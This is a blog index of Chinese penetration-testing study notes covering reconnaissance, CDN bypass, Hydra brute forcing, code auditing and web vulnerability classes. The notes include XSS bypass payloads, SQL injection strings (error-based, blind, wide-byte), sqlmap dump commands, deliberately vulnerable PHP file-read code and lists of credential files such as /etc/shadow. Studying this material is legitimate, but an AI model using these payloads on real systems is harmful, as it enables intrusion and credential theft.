filesize($filepath));\nfclose($file);文件写入php$filepath = &#39;./files/&#39;.$filename;\n$file = fopen($filepath, &#39;a+&#39;) or die(&#39;无法打开文件!&#39;);\nfwrite($file, $txt);\nfclose($file);文件&#x2F;目录列表读取php$dir = getcwd();\n// $dir = __DIR__;\n$file = scandir($dir.&#39;/files&#39;);\nforeach ($file as $value) &#123;\n    if ($value != &#39;.&#39; &amp;&amp; $value != &#39;..&#39;) &#123;\n        echo $value . &#39;&lt;br&gt;&#39;;\n    &#125;\n&#125;信息获取获取用户IPphpif ($HTTP_SERVER_VARS[&quot;HTTP_X_FORWARDED_FOR&quot;]) &#123;\n    $ip = $HTTP_SERVER_VARS[&quot;HTTP_X_FORWARDED_FOR&quot;];\n&#125; elseif ($HTTP_SERVER_VARS[&quot;HTTP_CLIENT_IP&quot;]) &#123;\n    $ip = $HTTP_SERVER_VARS[&quot;HTTP_CLIENT_IP&quot;];\n&#125; elseif ($HTTP_SERVER_VARS[&quot;REMOTE_ADDR&quot;]) &#123;\n    $ip = $HTTP_SERVER_VARS[&quot;REMOTE_ADDR&quot;];\n&#125; elseif (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;)) &#123;\n    $ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;);\n&#125; elseif (getenv(&quot;HTTP_CLIENT_IP&quot;)) &#123;\n    $ip = getenv(&quot;HTTP_CLIENT_IP&quot;);\n&#125; elseif (getenv(&quot;REMOTE_ADDR&quot;)) &#123;\n    $ip = getenv(&quot;REMOTE_ADDR&quot;);\n&#125; else &#123;\n    $ip = &quot;Unknown&quot;;\n&#125;\necho $ip;PHP获取客户端（浏览器）信息函数phpfunction get_broswer() &#123;\n    $sys = $_SERVER[&#39;HTTP_USER_AGENT&#39;];  //获取用户代理字符串  \n    if (stripos($sys, &quot;Firefox/&quot;) &gt; 0) &#123;  \n        preg_match(&quot;/Firefox\\/([^;)]+)+/i&quot;, $sys, $b);  \n        $exp[0] = &quot;Firefox&quot;;  \n        $exp[1] = $b[1];  \t//获取火狐浏览器的版本号  \n    &#125; elseif (stripos($sys, &quot;Maxthon&quot;) &gt; 0) &#123;  \n        preg_match(&quot;/Maxthon\\/([\\d\\.]+)/&quot;, $sys, $aoyou);  \n        $exp[0] = &quot;傲游&quot;;  \n        $exp[1] = $aoyou[1];  \n    &#125; elseif (stripos($sys, &quot;MSIE&quot;) &gt; 0) &#123;  \n        preg_match(&quot;/MSIE\\s+([^;)]+)+/i&quot;, $sys, $ie);  \n        $exp[0] = &quot;IE&quot;;  \n        $exp[1] = $ie[1];  //获取IE的版本号  \n    &#125; elseif (stripos($sys, &quot;OPR&quot;) &gt; 0) &#123;  \n        preg_match(&quot;/OPR\\/([\\d\\.]+)/&quot;, $sys, $opera);  \n        $exp[0] = &quot;Opera&quot;;  \n        $exp[1] = $opera[1];    \n    &#125; elseif(stripos($sys, &quot;Edge&quot;) &gt; 0) &#123;  \n        //win10 Edge浏览器 添加了chrome内核标记 在判断Chrome之前匹配  \n        preg_match(&quot;/Edge\\/([\\d\\.]+)/&quot;, $sys, $Edge);  \n        $exp[0] = &quot;Edge&quot;;  \n        $exp[1] = $Edge[1];  \n    &#125; elseif (stripos($sys, &quot;Chrome&quot;) &gt; 0) &#123;  \n        preg_match(&quot;/Chrome\\/([\\d\\.]+)/&quot;, $sys, $google);  \n        $exp[0] = &quot;Chrome&quot;;  \n        $exp[1] = $google[1];  //获取google chrome的版本号  \n    &#125; elseif(stripos($sys,&#39;rv:&#39;)&gt;0 &amp;&amp; stripos($sys,&#39;Gecko&#39;)&gt;0)&#123;  \n        preg_match(&quot;/rv:([\\d\\.]+)/&quot;, $sys, $IE);  \n        $exp[0] = &quot;IE&quot;;  \n        $exp[1] = $IE[1];  \n    &#125;else &#123;  \n        $exp[0] = &quot;未知浏览器&quot;;  \n        $exp[1] = &quot;&quot;;   \n    &#125;  \n    return $exp[0].&#39;(&#39;.$exp[1].&#39;)&#39;;  \n&#125;获取客户端系统信息phpfunction get_os() &#123;\n    $agent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];\n    $os = false;\n\n    if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; strpos($agent, &#39;95&#39;)) &#123;\n        $os = &#39;Windows 95&#39;;\n    &#125; else if (preg_match(&#39;/win 9x/i&#39;, $agent) &amp;&amp; strpos($agent, &#39;4.90&#39;)) &#123;\n        $os = &#39;Windows ME&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/98/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 98&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 6.0/i&#39;, $agent)) &#123;\n        $os = &#39;Windows Vista&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 6.1/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 7&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 6.2/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 8&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 10.0/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 10&#39;;#添加win10判断  \n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 5.1/i&#39;, $agent)) &#123;\n        $os = &#39;Windows XP&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt 5/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 2000&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/nt/i&#39;, $agent)) &#123;\n        $os = &#39;Windows NT&#39;;\n    &#125; else if (preg_match(&#39;/win/i&#39;, $agent) &amp;&amp; preg_match(&#39;/32/i&#39;, $agent)) &#123;\n        $os = &#39;Windows 32&#39;;\n    &#125; else if (preg_match(&#39;/linux/i&#39;, $agent)) &#123;\n        $os = &#39;Linux&#39;;\n    &#125; else if (preg_match(&#39;/unix/i&#39;, $agent)) &#123;\n        $os = &#39;Unix&#39;;\n    &#125; else if (preg_match(&#39;/sun/i&#39;, $agent) &amp;&amp; preg_match(&#39;/os/i&#39;, $agent)) &#123;\n        $os = &#39;SunOS&#39;;\n    &#125; else if (preg_match(&#39;/ibm/i&#39;, $agent) &amp;&amp; preg_match(&#39;/os/i&#39;, $agent)) &#123;\n        $os = &#39;IBM OS/2&#39;;\n    &#125; else if (preg_match(&#39;/Mac/i&#39;, $agent) &amp;&amp; preg_match(&#39;/PC/i&#39;, $agent)) &#123;\n        $os = &#39;Macintosh&#39;;\n    &#125; else if (preg_match(&#39;/PowerPC/i&#39;, $agent)) &#123;\n        $os = &#39;PowerPC&#39;;\n    &#125; else if (preg_match(&#39;/AIX/i&#39;, $agent)) &#123;\n        $os = &#39;AIX&#39;;\n    &#125; else if (preg_match(&#39;/HPUX/i&#39;, $agent)) &#123;\n        $os = &#39;HPUX&#39;;\n    &#125; else if (preg_match(&#39;/NetBSD/i&#39;, $agent)) &#123;\n        $os = &#39;NetBSD&#39;;\n    &#125; else if (preg_match(&#39;/BSD/i&#39;, $agent)) &#123;\n        $os = &#39;BSD&#39;;\n    &#125; else if (preg_match(&#39;/OSF1/i&#39;, $agent)) &#123;\n        $os = &#39;OSF1&#39;;\n    &#125; else if (preg_match(&#39;/IRIX/i&#39;, $agent)) &#123;\n        $os = &#39;IRIX&#39;;\n    &#125; else if (preg_match(&#39;/FreeBSD/i&#39;, $agent)) &#123;\n        $os = &#39;FreeBSD&#39;;\n    &#125; else if (preg_match(&#39;/teleport/i&#39;, $agent)) &#123;\n        $os = &#39;teleport&#39;;\n    &#125; else if (preg_match(&#39;/flashget/i&#39;, $agent)) &#123;\n        $os = &#39;flashget&#39;;\n    &#125; else if (preg_match(&#39;/webzip/i&#39;, $agent)) &#123;\n        $os = &#39;webzip&#39;;\n    &#125; else if (preg_match(&#39;/offline/i&#39;, $agent)) &#123;\n        $os = &#39;offline&#39;;\n    &#125; else &#123;\n        $os = &#39;未知操作系统&#39;;\n    &#125;\n    return $os;\n&#125;获取服务器基本信息phppublic function osinfo() &#123;\n    $info = array(\n        &#39;操作系统&#39;\t=&gt;\tPHP_OS,\n        &#39;运行环境&#39;\t=&gt;\t$_SERVER[&quot;SERVER_SOFTWARE&quot;],\n        &#39;主机名&#39;\t\t=&gt;\t$_SERVER[&#39;SERVER_NAME&#39;],\n        &#39;WEB服务端口&#39;\t=&gt;\t$_SERVER[&#39;SERVER_PORT&#39;],\n        &#39;网站文档目录&#39;\t=&gt;\t$_SERVER[&quot;DOCUMENT_ROOT&quot;],\n        &#39;浏览器信息&#39;\t=&gt;\tsubstr($_SERVER[&#39;HTTP_USER_AGENT&#39;], 0, 40),\n        &#39;通信协议&#39;\t=&gt;\t$_SERVER[&#39;SERVER_PROTOCOL&#39;],\n        &#39;请求方法&#39;\t=&gt;\t$_SERVER[&#39;REQUEST_METHOD&#39;],\n        // &#39;ThinkPHP版本&#39;=&gt;THINK_VERSION,\n        &#39;PHP版本&#39;\t=&gt;\tPHP_VERSION,\t \n        &#39;上传附件限制&#39;\t=&gt;\tini_get(&#39;upload_max_filesize&#39;),\n        &#39;执行时间限制&#39;\t=&gt;\tini_get(&#39;max_execution_time&#39;).&#39;秒&#39;,\n        &#39;服务器时间&#39;\t=&gt;\tdate(&quot;Y年n月j日 H:i:s&quot;),\n        &#39;北京时间&#39;\t=&gt;\tgmdate(&quot;Y年n月j日 H:i:s&quot;,time()+8*3600),\n        &#39;服务器域名/IP&#39;\t=&gt;\t$_SERVER[&#39;SERVER_NAME&#39;].&#39; [ &#39;.gethostbyname($_SERVER[&#39;SERVER_NAME&#39;]).&#39; ]&#39;,\n        &#39;剩余空间&#39;\t=&gt;\tround((disk_free_space(&quot;.&quot;)/(1024*1024)),2).&#39;M&#39;,\n        &#39;当前用户的IP地址&#39;=&gt;\t$_SERVER[&#39;REMOTE_ADDR&#39;],\n    );\n \n    return $info;\n&#125;登录验证\n后台管理系统有多个页面文件, 为了方便验证, 一般选用cookie或session进行验证\ncookie安全: 修改, 伪造, 盗取\nsession安全:  会话劫持\n验证码\n\nPHP框架thinkphp框架\ntop-think&#x2F;think: ThinkPHP Framework ——十年匠心的高性能PHP框架 (github.com)\n\nThinkPHP官方手册\n\n\n漏洞存在情况\n没有按照框架要求的写法去处理(框架写法有内置安全过滤机制)\n框架本身存在漏洞\n\n寻找TP框架漏洞\n看写法\n看历史漏洞-&gt;版本\n\n获取版本信息\n黑盒:\n\n判断是不是TP: 看返回数据包\n看版本: 报错信息\nurl地址\n\n\n白盒: 直接看配置文件\n\n\n","slug":"PHP开发","date":"2024-02-28T10:59:34.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,PHP开发","author_index":"Myprefer"},{"id":"13b0d2b7c823e330c30d342410661385","title":"信息打点","content":"信息点\n基础信息\n操作系统信息\n应用信息\n防护方法信息\n人员信息\n其他信息等\n\n架构\n中间件\n数据库\n操作系统\n开发语言\nCMS\n\n开发语言\nurl文件后缀\n\n查看访问数据包\n\n搜索引擎搜索\ntxtsite:http://xiaodi8.com index.php\n搭建组合推算如: apache+php+mysql\n\n\n中间件\n查看返回数据包\n搭建组合推算\n端口扫描\n\n数据库\n端口扫描(mysql:3306)\n搭建组合推算\n\n操作系统\n大小写如:\n\nhttp://xiaodi8.com/index.php可以访问\nhttp://xiaodi8.com/indEx.php无法访问很有可能是Linux系统\n如果对大小写不敏感, 可能是Win系统\n\n\nTTL值默认的TTL值:\n1、WINDOWS NT&#x2F;2000   TTL：1282、WINDOWS 95&#x2F;98     TTL：323、UNIX              TTL：2554、LINUX             TTL：645、WIN7          TTL：64\n一般看哪个更接近\n\n\n源码常见的Web源码泄漏漏洞及其利用 - SecPulse.COM | 安全脉搏\n分类:\nCMS开源\n闭源售卖\n自主研发\n\n源码泄露原因:1、源码本身的特性2、管理员不好的习惯3、管理员不好的配置4、管理员不好的意识5、管理员资源信息搜集\n获取:方式1:\n\n直接购买或下载\n\n方式2:\n\ncomposer.]son\ngit源码泄露\nsvn源码泄露\nhg源码泄漏\n网站备份压缩文件\nWEB-INF&#x2F;web.m1泄露(java)\nDS Store文件泄露\nSWP文件泄露\nCVS泄露\nBzr泄露\nGitHub源码泄漏\n\n方式3:\n\n黑产源码\n\nWAF检测\nwafw00f\nEnableSecurity&#x2F;wafw00f at v2.2.0 (github.com)\n\n\n真实IP判断是否有CDN\n超级Ping\n\nDNS绕过绕过CDN寻找网站真实IP的方法汇总 - 知乎 (zhihu.com)\n绕过CDN查看网站真实IP的一些办法 - blacksunny - 博客园 (cnblogs.com)\n查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法 - milantgh - 博客园 (cnblogs.com)\n接口查询\n全球 CDN 服务商查询_专业精准的IP库服务商_IPIP\n\n漏洞&amp;遗留文件利用SSRF漏洞让目标服务器向攻击者主动发起请求, 可以监听请求来获取目标IP\n\n子域名查询目标服务器的子域名可能没有配置DNS\n\n查询国外访问配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址\n\n邮件&amp;备案密码找回发送邮件，查看邮件发送方地址找寻, 通过备案信息确认\n\n全网扫描FuckCDN\nTai7sy&#x2F;fuckcdn: CDN真实IP扫描，易语言开发 (github.com)\n扫描全球ip匹配web内容，使用工具匹配扫描网段title信息\n\n找phpinfo()之类的探针\n\n查看历史\n目标站点以前可能没有配置CDN\n\nCDN本身入手\n利用社工等，得到控制面板的账号密码，那真实ip就很轻易能获取到了。\n\n\n找到IP后\nHOSTS绑定指向访问\n(win系统C:\\Windows\\System32\\drivers\\etc\\hosts)将指定域名指向的ip, 本来是指向节点ip的, 可以修改为指向真实ip\n\n\n\nAPP资产提取外在\n抓包-Fd&amp;茶杯&amp;Burp\n\n封包-封包监听工具\n使用封包监听也可抓到数据包\n\n\n内在\n提取资源-ApplnfoScanner\nAppInfoScanner\n\n反编译载入IDEA\n\n安卓修改大师\n\n使用idea对反编译出的项目进行资源收集\n\n\n\n\n​\t资产提取后, 需进一步对代码进行分析\t\nAPP-框架使用-Xposed&amp;JustTrustMe\nAPP可能存在加壳的情况, 可通过工具判断apk是否加壳Android Spider ApkScan-PKID 查壳工具下载使用以及相关技术介绍-CSDN博客\n\n可通过安装xp框架的方式进行脱壳处理\nZjDroid\nAndroid中Xposed框架篇—基于Xposed的一款脱壳神器ZjDroid工具原理解析-CSDN博客\nfrida\n\n\n小程序\n登录PC端&#x2F;安卓模拟器端微信, fiddler抓包\n\n工具使用网络空间搜索引擎\nHunt\n\n鹰图平台 (qianxin.com)\n\n\nFOFA\n\n网址: https://fofa.info/\n\n\n360Quake\n\n360网络空间测绘 — 因为看见，所以安全\n\n\nShodan\n\nShodan Search Engine\n\n\nZoomeye\n\n ZoomEye(“钟馗之眼”)\n\n\n\n可搜索\n\n关联资产\n特征资产(中间件等)\n资产信息\n\n自动化工具\nNmap\n\n基本操作\n\n基本快速扫描\nshnmap 127.0.0.1探测目标主机在1-10000范围内所开放的端口\n\n扫描多个目标\ntxtnmap &lt;一个ip&gt; &lt;另一个ip&gt;\n扫描整个网段\ntxtnmap 127.0.0.1/24\n扫描指定端口\ntxtnmap 192.168.3.74 -p80\n\n\n实用选项\ntxt-o      \t\t启用操作系统检测\n--top-ports    \t扫描&lt;number&gt;最常用的端口\n--proxies &lt;url,port&gt;    用HTTP/SOCK4代理\n\n\nFinger-自动识别指纹EASY233&#x2F;Finger: 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 (github.com)\n\nKunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集Kunyu&#x2F;doc&#x2F;README_CN.md at main · knownsec&#x2F;Kunyu (github.com)\n\nARL灯塔：自动化信息收集工具\nTophantTechnology&#x2F;ARL: ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。 (github.com)\n\nShuiZe-水泽: 信息收集自动化工具0x727&#x2F;ShuiZe_0x727: 信息收集自动化工具 (github.com)\n水泽的安装和使用（信息收集自动化工具）_水泽安装-CSDN博客\n\n\n\n","slug":"信息打点","date":"2024-02-26T15:22:53.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,信息收集","author_index":"Myprefer"},{"id":"286ff70f4520766e6639429252bb03a3","title":"穷举爆破","content":"常见的端口服务txthttp 80\nhttps 443\nftp 21\nssh 22\nmysql 3306\nmssql 1433\nrsync 873\noracle 1521\nmongo 28017\nredis 6379\ntomcat 8080\nsmtp 25\nPOP3 110\ndns 53\ntelent 23\nvnc 5900\npcanywhere 5632\nApache/Tomcat/Nginx/Axis2/resin/jboss 80|8080\nWebLogic 7001\nJenkins 8080 8089\nSNMP 161\nZabbix 8069\nelasticsearch 9200 9300\nrdp 3389穷举爆破工具九头蛇hydrashhydra -h\nhydra [[[-l LOGIN|-L FILE] [-p PASS|-PFILE]] | [-C FILE]] [-e ns]\n\n[-o FILE] [-t TASKS] [-M FILE [-T TASKS]][-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]\n\n-R 继续从上一次进度接着破解。\n\n-S 采用SSL链接。\n\n-s PORT 可通过这个参数指定非默认端口。\n\n-l LOGIN 指定破解的用户，对特定用户破解。\n\n-L FILE 指定用户名字典。\n\n-p PASS 小写，指定密码破解，少用，一般是采用密码字典。\n\n-P FILE 大写，指定密码字典。\n\n-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。\n\n-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。\n\n-M FILE 指定目标列表文件一行一条。\n\n-o FILE 指定结果输出文件。\n\n-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。\n\n-t TASKS 同时运行的线程数，默认为16。\n\n-w TIME 设置最大超时的时间，单位秒，默认是30s。\n\n-v / -V 显示详细过程。\n\nservice 指定服务名，支持的服务和协议：telnetftp pop3[-ntlm] imap[-ntlm] smb smbnt \nhttp-&#123;head|get&#125; http-&#123;get|post&#125;-formhttp-proxy cisco cisco-enable vnc \nldap2 ldap3 mssql mysql oracle-listenerpostgres nntp socks5 rexec \nrlogin pcnfs snmp rsh cvs svn icq sapr3 sshsmtp-auth[-ntlm] pcanywhere \nteamspeak sip vmauthd firebird ncp afp等等。","slug":"穷举爆破","date":"2024-02-24T09:07:28.000Z","categories_index":"","tags_index":"网络安全,学习日志,穷举爆破","author_index":"Myprefer"},{"id":"b872efa5eac542f6ec33ce5b2ff94521","title":"信息收集","content":"\n信息收集是渗透测试的前提\n\nwhois域名注册信息查询\n命令: whois &lt;域名&gt;\n站长工具_whois查询工具_爱站网\n同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan\n天眼查\n\n文件和目录扫描工具\nDirBuster\nPker\n御剑后台扫描工具\n\n子域名收集域名构成域名各部分由.分隔, 最右边的为一级域名(顶级域名, TLD, 如com, org等), 其左为二级域名(SLD), 以此类推\n每级域名控制下一级域名的分配\n子域名: 例如space.bilibili.com和www.bilibili.com是bilibili.com的子域名\n端口扫描\n端口扫描相关概念：端口-&gt;服务\n\n\n\n\n\n\n\n\n\n一般在知道服务器开放了哪些端口后，就知道服务器开启了哪些服务。\n\n端口扫描的实\n端口扫描包括向每个端口发送消息，一次只发送一个消息。接收到的回应类型表示是否在使用该端口并且可由此探寻弱点。\n\n工具\n\nNmap\n\n御剑\n\n\n\n\n常见开放端口及攻击方向\n\n\n\n\n\n\n\n\n\n指纹识别\n识别出相应的Web容器或CMS才能查找与其相关的漏洞, 然后才能进行相应的渗透操作\n\n\n查找真实IP\n判断是否使用CDN\n\nping, 观察域名解析情况\n\n在不同地区ping目标看解析ip是否一致\n网站测速|网站速度测试|网速测试|电信|联通|网通|全国|监控|CDN|PING|DNS 一起测试|17CE.COM\n\n\n\n目标服务器不存在CDN\n\niP地址查询–手机号码查询归属地 | 邮政编码查询 | iP地址归属地查询 | 身份证号码验证在线查询网 (ip138.com)\n\n\n存在CDN\n\n内部邮箱源\n扫描网站测试文件, 如phpinfo, test等\n分站域名, 二级域名可能没有挂CDN\n国外代理访问\n查询域名解析记录, 目标可能以前没有使用CDN: Netcraft | Leader in Phishing Detection, Cybercrime Disruption and Website Takedown\n很多网站使用CloudFlare提供的CDN, 可以绕过CloudFlare CDN查找真实ip\n\n\n验证获取的IP\n直接用获取到的IP访问, 看返回的页面是否和访问域名返回的一样\n\n\n","slug":"信息收集","date":"2024-02-22T07:35:50.000Z","categories_index":"","tags_index":"网络安全,学习日志,信息收集","author_index":"Myprefer"},{"id":"17847c41b99752f3acca442e5291529b","title":"代码审计","content":"概念 由具备丰富的编码经验并对安全编码及应用安全工具有很深刻理解的安全服务人员根据一定的代码规范和标准，针对应用程序源代码，从结构，脆弱性以及缺陷等方面进行审查，最终输出代码审计报告，完善应用程序，提升自身安全水平。\n\n\n\n\n\n\n\n\n\n步骤:\n\n配置审计分析环境\n熟悉业务流程\n分析程序架构\n工具自动化分析\n人工审计结果\n整理审计报告\n\n思路\n观察项目整体框架\n项目文件目录结构\n明确每个文件的作用功能\n\n\n根据敏感关键字回溯参数传递过程\n预定义的变量()$_GET $_POST $_COOKIE $_SERVER $_ENV $_SESSION等)\n未初始化的变量(regist_globle=on)\n变量覆盖\n变量的传递存储(中转的变量)\n文件包含(require，include,require_once,include_once&#96;)\n代码执行(eval() assert()等)\n命令执行(exec() shell_exec() system()等)\nSQL注入和XSS漏洞相关的关键字\nSQL注入(select from、mysql_connect、mysql_query、mysql_fetch_row、update、insert、delete SET NAMES、character_set_client=gbk、mysql_set_charset(&#39;gbk’) urldecode、rawurldecode )\nXSS(print、print_r、echo、printf、sprintf、die、var_dump、var_export等)\n\n\n查找可控变量，追踪变量传递过程\n常见的可操控变量：name、id、password、pwd、select、search\n\n\n寻找敏感功能点，通读功能点代码\n文件上传\n文件管理\n登录认证\n密码管理\n\n\n有逻辑性、有目的性地通读全文代码\n目的性: 特别关注函数集文件、配置文件、安全过滤文件、index文件等重要文件\n\n\n\n目的\n实现快速的漏洞扫描和修补\n打造更加安全可靠的网络运行环境\n\n代码审计工具RIPS\nSEAY\n","slug":"代码审计","date":"2024-02-14T08:54:53.000Z","categories_index":"","tags_index":"网络安全,学习日志,WEB攻防,代码审计","author_index":"Myprefer"},{"id":"d8c6760c0189ec6549efd1450ac394f5","title":"漏洞分类","content":"暴力破解漏洞\n通过系统地组合所有可能性（例如登录时用到的账户名、密码），尝试所有的可能性破解用户的账户名、密码等敏感信息，经常是使用自动化脚本组合出正确的用户名和密码。简单理解： 连续性尝试 + 字典 + 自动化\n\n流程\n确认登录接口的脆弱性\n比如:尝试登录–抓包–观察验证元素和response信息\n\n\n对字典进行优化\n根据注册提示信息进行优化\n管理员\n\n\n工具自动化操作\n\nXSS跨站脚本介绍\n跨站脚本，英文全称：Cross-Site Scripting\n\n通过输入可以被解析的特殊字符串, 如\nhtml&lt;/p&gt;&lt;script&gt;alert(&#39;this is an alart&#39;);&lt;/script&gt;&lt;p&gt;其中script标签内的代码会被执行\n\n分类: 反射型XSS, 储存型XSS, DOM型XSS\n\n反射型XSS\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容2、后端接收提交的数据，并没有对输入进行过滤3、然后就将其呈现给了前端，浏览器执行了恶意代码\n\n\n\n存储型XSS\n\n存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在留言板处输入内容，构造恶意代码2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作3、此时，我们的恶意代码已经保存在了数据库，4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码\n\n\n\nDOM型XSS\n\n基于文档对象模型的漏洞，可以动态的构造DOM节点\n不经过后端代码，直接构造恶意代码，即可在前端展示\n\n\n\n\n\n测试流程\n在目标站点上找到输入点, 比如查询接口, 留言板等\n输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理\n通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);\n提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;\n\ntips\n一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS\n由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);\n通过变化不同的script，尝试绕过后台过滤机制;\n\nXSS绕过\n转换\n大小写&lt;ScRipT&gt;\n拼凑&lt;scr&lt;script&gt;ipt&gt;\n注释&lt;sc&lt;!--a--&gt;ript&gt;\n\n\n编码\nurl编码\nhtml编码\n\n\n\nSQL注入概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n宽字节注入\n后端对输入的内容进行了转义, &#39;转义为\\&#39;使原本的payloadvince&#39; or 1=1 ;#无法使用\n由于mysql使用gbk编码, 单引号转义后编码为%5c%27, 如果在单引号前面输入%df使其变成%df%5c%27前面的%df%5c就会被解析为一个汉字, 单引号%27就成功逃逸了, 实现了闭合\npayload修改为vince%df&#39; or 1=1;#\n\nSQLmap使用文档介绍 - sqlmap 用户手册 (highlight.ink)\n\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; //带上cookie对URL进行注入探测\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; --current-db //获取数据库名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx --tables //获取表名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx --columns //获取列名\ntxt-u &quot;url&quot; --cookie=&quot;xxx&quot; -D xxx -T xxx -C xxx yyy,zzz,xxx --dump //获取指定列的信息tip:--start 1 --stop 10 (只获取前十列数据)\n\n\n文件漏洞任意文件读取与下载介绍\n当网站需要提供文件读取或文件下载功能，且对用户读取或下载的文件不做限制，则用户就能够恶意读取或下载任意敏感文件\n\n例如:\n\n\nphp// 文件读取\n&lt;?php\n    $filename = $_GET[&#39;filename&#39;];\n    if($filename)&#123;\n        echo file_get_contents($filename);\n    &#125;\n?&gt;php// 文件下载\n&lt;?php\n    $filename = $_GET[&#39;filename&#39;];\n    if(file_exists($filename))&#123;\n        $file=fopen($filename,&quot;r&quot;);\n        header(&quot;Content-Type: application/octet-stream&quot;);\n        header(&quot;Accept-Ranges: bytes&quot;);\n        header(&quot;Accept-Length: &quot;.filesize($filename));\n        header(&quot;Content-Disposition: attachment; filename=&quot; . $filename);\n        echo fread($file,filesize($filename));\n        fclose($file);\n    &#125;\n?&gt;利用\n获取常规的配置文件，如ssh,weblogic,ftp,mysql等相关配置\n获取各种日志文件，从中寻找一些后台地址，文件上传点。甚至可能寻找到别人留下的后门\n获取web业务文件进行白盒审计\n\n\n敏感信息win:\ntxtC:\\boot.ini     查看系统版本 \nC:\\Windows\\System32\\inetsrv\\MetaBase.xml    IIS配置文件 \nC:\\Windows\\repair\\sam       存储系统初次安装的密码 \nC:\\Program Files\\mysql\\my.ini       Mysql配置 \nC:\\Program Files\\mysql\\data\\mysql\\user.MYD   Mysql root \nC:\\Windows\\php.ini      php配置信息 \nC:\\Windows\\my.ini       Mysql配置信息linux:\ntxt/root/.ssh/*\n/etc/passwd \n/etc/shadow \n/etc/my.cnf     mysql配置文件\n/etc/httpd/conf/httpd.conf  apache配置文件\n/root/.bash_history     用户历史命令记录文件\n/root/.mysql_history    mysql历史命令记录文件\n/proc/self/fd/fd[0-9]*(文件标识符) \n/proc/mounts        